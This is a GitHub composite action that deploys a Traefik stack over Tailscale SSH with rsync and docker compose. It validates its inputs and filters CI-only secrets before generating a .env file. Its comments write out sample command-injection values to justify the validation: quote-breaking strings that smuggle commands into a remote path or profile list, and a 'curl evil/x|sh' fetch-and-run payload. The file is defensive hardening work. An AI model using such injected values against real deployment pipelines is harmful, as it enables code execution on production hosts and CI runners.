name: 'Deploy Traefik Infrastructure'
description: 'Deploys Traefik + supporting infrastructure stack to a server via rsync + docker compose over Tailscale SSH'

# v2.0.0 — Tailscale-SSH-only. ssh_private_key removed; auth via
# Tailnet identity (tag:ci-deploy) + tailnet ACL ssh:-section.

inputs:
  target:
    description: 'Inventory target name (used for logging)'
    required: true
  target_environment:
    description: 'Target environment (production / staging)'
    required: false
    default: 'production'
  compose_profiles:
    description: >-
      Docker Compose profile(s) to activate on the destination host. Single value
      or comma-separated list; every element must be in the allowlist
      (main, staging, monitoring, geo). Defaults to "main" for backward-compat
      with callers that pre-date the profile refactor.
    required: false
    default: 'main'
  remote_path:
    description: 'Remote deployment path on the server'
    required: false
    default: '/srv/infrastructure/webapp-management'
  ssh_host:
    description: 'Tailnet hostname (e.g. main-prod.tail990d7f.ts.net)'
    required: true
  ssh_user:
    description: 'SSH user on the target host'
    required: true
  secrets_context_json:
    description: 'JSON-serialized secrets context (toJson(secrets)) for generate-env'
    required: true
  ts_oauth_client_id:
    description: 'Tailscale OAuth client ID. Required (v2.0.0+).'
    required: true
  ts_oauth_secret:
    description: 'Tailscale OAuth client secret.'
    required: true
  ts_tag:
    description: 'Tailnet tag for the ephemeral CI node.'
    required: false
    default: 'tag:ci-deploy'

runs:
  using: 'composite'
  steps:
    - name: Connect to tailnet
      uses: bigler-webapps/workflow-templates/.github/actions/tailnet-connect@v2.5.2
      with:
        ts_oauth_client_id: ${{ inputs.ts_oauth_client_id }}
        ts_oauth_secret: ${{ inputs.ts_oauth_secret }}
        ts_tag: ${{ inputs.ts_tag }}

    - name: 🔎 Validate inputs
      shell: bash
      env:
        INPUT_SSH_HOST: ${{ inputs.ssh_host }}
        INPUT_SSH_USER: ${{ inputs.ssh_user }}
        INPUT_COMPOSE_PROFILES: ${{ inputs.compose_profiles }}
        INPUT_TS_OAUTH_CLIENT_ID: ${{ inputs.ts_oauth_client_id }}
        INPUT_TS_OAUTH_SECRET: ${{ inputs.ts_oauth_secret }}
        INPUT_TARGET: ${{ inputs.target }}
        INPUT_REMOTE_PATH: ${{ inputs.remote_path }}
        INPUT_TARGET_ENVIRONMENT: ${{ inputs.target_environment }}
      run: |
        set -euo pipefail
        if [ -z "$INPUT_TS_OAUTH_CLIENT_ID" ] || [ -z "$INPUT_TS_OAUTH_SECRET" ]; then
          echo "❌ ts_oauth_client_id and ts_oauth_secret are required (v2.0.0+)"
          exit 1
        fi
        for var_name in INPUT_SSH_HOST INPUT_SSH_USER; do
          if [ -z "${!var_name}" ]; then
            echo "❌ Missing required input '${var_name}' for target '${INPUT_TARGET}'."
            exit 1
          fi
          # A leading '-' would be parsed by ssh as an option, not a destination
          # (e.g. -oProxyCommand=...). Charset-restrict both while we are here.
          if [[ ! "${!var_name}" =~ ^[A-Za-z0-9][A-Za-z0-9._@-]*$ ]]; then
            echo "❌ Invalid '${var_name}' value '${!var_name}' (expected [A-Za-z0-9._@-], not starting with '-')."
            exit 1
          fi
        done
        # remote_path is interpolated as `cd "${REMOTE_PATH}"` inside the same
        # unquoted SSH heredoc as COMPOSE_PROFILES below, so it is the identical
        # injection class and was previously validated NOT AT ALL: a value like
        # '/srv/x"; touch /tmp/pwned; echo "' broke out of the quotes and ran on
        # the production host. Absolute path, conservative charset, no line breaks.
        if [[ ! "$INPUT_REMOTE_PATH" =~ ^/[A-Za-z0-9._/-]*$ ]] || [[ "$INPUT_REMOTE_PATH" == *".."* ]]; then
          echo "❌ Invalid 'remote_path' value '$INPUT_REMOTE_PATH' (expected an absolute path over [A-Za-z0-9._/-], no '..')."
          exit 1
        fi
        # target_environment selects the generate-env profile AND is the value that
        # used to be interpolated raw into the "Generate .env" run: body. It now
        # goes through an env var there, but keep it allowlisted anyway: it decides
        # which environment's secrets get written, so a typo must fail loudly
        # rather than silently produce the wrong .env on a production host.
        if [[ ! "$INPUT_TARGET_ENVIRONMENT" =~ ^(production|staging)$ ]]; then
          echo "❌ Invalid 'target_environment' value '$INPUT_TARGET_ENVIRONMENT' (allowed: production, staging)."
          exit 1
        fi
        # Comma-separated list allowed (Docker Compose reads COMPOSE_PROFILES the
        # same way), so one server can activate several profiles -- e.g. "main,geo"
        # for the single prod host that carries the Valhalla tile data, while the
        # other "main" hosts stay without it.
        #
        # Matched with bash [[ =~ ]], NOT `grep -qE`: grep matches LINE BY LINE, so
        # a multi-line value whose first line is a valid profile passes while the
        # remaining lines carry anything at all. This value is interpolated into an
        # unquoted `ssh ... bash <<EOF` heredoc below, so that was a command
        # injection path into the deploy shell on production hosts. Verified:
        # printf 'main\n"; touch /tmp/pwned; echo "\n' | grep -qE '<pattern>' matched;
        # the same payload is rejected here. The explicit newline check is kept in
        # front of the regex so the guarantee does not rest on a regex subtlety.
        case "$INPUT_COMPOSE_PROFILES" in
          *$'\n'*|*$'\r'*)
            echo "❌ 'compose_profiles' must not contain line breaks."
            exit 1
            ;;
        esac
        [[ "$INPUT_COMPOSE_PROFILES" =~ ^(main|staging|monitoring|geo)(,(main|staging|monitoring|geo))*$ ]] || {
          echo "❌ Invalid 'compose_profiles' input '$INPUT_COMPOSE_PROFILES' (allowed: comma-separated list of main, staging, monitoring, geo)"
          exit 1
        }
        echo "✅ Inputs validated."

    - name: 🐍 Setup Python
      uses: actions/setup-python@b64ffcaf5b410884ad320a9cfac8866006a109aa  # v4.8.0
      with:
        python-version: '3.10'

    - name: 📦 Install dependencies
      shell: bash
      run: |
        # See deploy-app: generate-env needs only PyYAML + dcm modules, not Django.
        # --no-deps + floor >=2.17.0 guarantees app_env support on Python 3.10.
        pip install "PyYAML==6.0.2"
        pip install --no-deps "django-core-micha>=2.17.0"

    - name: 🔐 Generate .env
      shell: bash
      env:
        SECRETS_CONTEXT_RAW: ${{ inputs.secrets_context_json }}
        # Via env, NOT a raw ${{ }} expression in the run: body. A raw expression
        # is substituted into the script text BEFORE bash parses it, so a value
        # like "production; curl evil/x|sh" would execute on the runner itself.
        # Validated against an allowlist in the "Validate inputs" step above.
        TARGET_ENVIRONMENT: ${{ inputs.target_environment }}
      run: |
        set -euo pipefail
        # S5/S21 partial mitigation: drop CI-only secret families before
        # generate-env sees them. TS_ added in v2.0.0 (Tailscale OAuth).
        # S224: also drop CF account-level tokens and TF_CLOUD_TOKEN (exact
        # match) — neither cloudflared nor Traefik needs them; only
        # CLOUDFLARE_TUNNEL_TOKEN must stay (cloudflared auth).
        SECRETS_CONTEXT=$(
          printf '%s' "$SECRETS_CONTEXT_RAW" \
            | jq -c 'with_entries(select(.key | test("^(SSH_|B2_|RESTIC_|GITHUB_|TS_)|^(CLOUDFLARE_API_TOKEN|CLOUDFLARE_ACCESS_API_TOKEN|CLOUDFLARE_ACCOUNT_ID|TF_CLOUD_TOKEN)$") | not))'
        )
        unset SECRETS_CONTEXT_RAW
        export SECRETS_CONTEXT
        generate-env --env "${TARGET_ENVIRONMENT}" --config project.yaml

    - name: 🔌 Pre-flight Tailscale-SSH connectivity check
      shell: bash
      env:
        SSH_HOST: ${{ inputs.ssh_host }}
        SSH_USER: ${{ inputs.ssh_user }}
      run: |
        set -euo pipefail
        MAX_ATTEMPTS=5
        SLEEP_BETWEEN=10
        for attempt in $(seq 1 $MAX_ATTEMPTS); do
          echo "→ Attempt ${attempt}/${MAX_ATTEMPTS}: ssh ${SSH_USER}@${SSH_HOST} true"
          if ssh -o BatchMode=yes \
                 -o StrictHostKeyChecking=accept-new \
                 -o ConnectTimeout=15 \
                 "${SSH_USER}@${SSH_HOST}" true 2>&1; then
            echo "✅ Tailscale-SSH reachable as ${SSH_USER}@${SSH_HOST}"
            exit 0
          fi
          if [ "$attempt" -lt "$MAX_ATTEMPTS" ]; then
            echo "⏳ Attempt ${attempt}/${MAX_ATTEMPTS} failed, retrying in ${SLEEP_BETWEEN}s..."
            sleep "$SLEEP_BETWEEN"
          fi
        done
        echo "❌ Tailscale-SSH pre-flight failed after ${MAX_ATTEMPTS} attempts."
        echo "   Common causes:"
        echo "   - MagicDNS not yet settled after runner joined the Tailnet (transient race)"
        echo "   - Tailnet ACL ssh:-section missing rule for tag:ci-deploy → ${SSH_HOST} as ${SSH_USER}"
        echo "   - tailscaled on target host not running with --ssh"
        echo "   - Target host offline (check '${SSH_HOST}' in tailscale status)"
        exit 1

    - name: 📂 Rsync project to server
      shell: bash
      env:
        SSH_HOST: ${{ inputs.ssh_host }}
        SSH_USER: ${{ inputs.ssh_user }}
        REMOTE_PATH: ${{ inputs.remote_path }}
      run: |
        set -euo pipefail
        # Plain ssh over Tailnet — auth=none (Tailscale-SSH server-side).
        rsync -rlvz --timeout=60 \
          --delete --delete-delay \
          --partial --delay-updates \
          --no-owner --no-group --no-perms --omit-dir-times \
          --chmod=Du=rwx,Dg=rwx,Do=rx,Fu=rw,Fg=rw,Fo=r \
          --rsync-path="mkdir -p ${REMOTE_PATH} && rsync" \
          -e "ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=15" \
          --exclude '.git' \
          --exclude '.github' \
          --exclude 'acme.json' \
          --exclude 'uptime-kuma-data' \
          --exclude 'certs-export' \
          --exclude 'backup' \
          --exclude 'wireguard/config' \
          ./ "${SSH_USER}@${SSH_HOST}:${REMOTE_PATH}"

    - name: 🚀 Start containers
      shell: bash
      env:
        SSH_HOST: ${{ inputs.ssh_host }}
        SSH_USER: ${{ inputs.ssh_user }}
        REMOTE_PATH: ${{ inputs.remote_path }}
        COMPOSE_PROFILES: ${{ inputs.compose_profiles }}
      run: |
        set -euo pipefail
        ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=15 "${SSH_USER}@${SSH_HOST}" bash <<EOF
        set -euo pipefail
        cd "${REMOTE_PATH}"

        if [ ! -f .env ]; then echo "❌ .env missing"; exit 1; fi

        DOCKER="docker"
        if ! docker info >/dev/null 2>&1; then
          DOCKER="sudo -n docker"
        fi

        if [ ! -f acme.json ]; then touch acme.json; chmod 600 acme.json; fi
        \$DOCKER network inspect traefik_proxy >/dev/null 2>&1 || \$DOCKER network create traefik_proxy

        # COMPOSE_PROFILES set INSIDE the SSH session so docker compose sees it.
        # Value is regex-validated upstream; safe to template-inline.
        export COMPOSE_PROFILES="${COMPOSE_PROFILES}"

        # `up -d --remove-orphans` is idempotent: it starts missing services,
        # recreates only those whose compose config changed (image/env-file/
        # labels/mounts), and removes orphan containers. Unchanged services
        # (e.g. uptime-kuma on docs-only pushes) stay running untouched.
        # A previous defensive 'down' step was removed because it caused
        # unrelated app deploys hitting Kuma to fail during the brief downtime
        # window.
        #
        # Pre-up cleanup of stopped containers in THIS project's scope
        # (running containers untouched). Catches residual hash-renamed
        # orphans from any historical interrupted '--force-recreate' so the
        # subsequent 'up' doesn't hit name-conflict errors. Cheap on a healthy
        # stack (nothing to remove).
        COMPOSE_PROJECT_NAME=\$(grep -E '^COMPOSE_PROJECT_NAME=' .env 2>/dev/null | cut -d= -f2- || true)
        if [ -n "\${COMPOSE_PROJECT_NAME:-}" ]; then
          echo "🧹 Pruning stopped containers in project \${COMPOSE_PROJECT_NAME}..."
          \$DOCKER container prune -f --filter "label=com.docker.compose.project=\${COMPOSE_PROJECT_NAME}" || true
        fi

        echo "🚀 Starting stack with COMPOSE_PROFILES=\${COMPOSE_PROFILES}..."
        \$DOCKER compose --env-file .env up -d --remove-orphans
        EOF
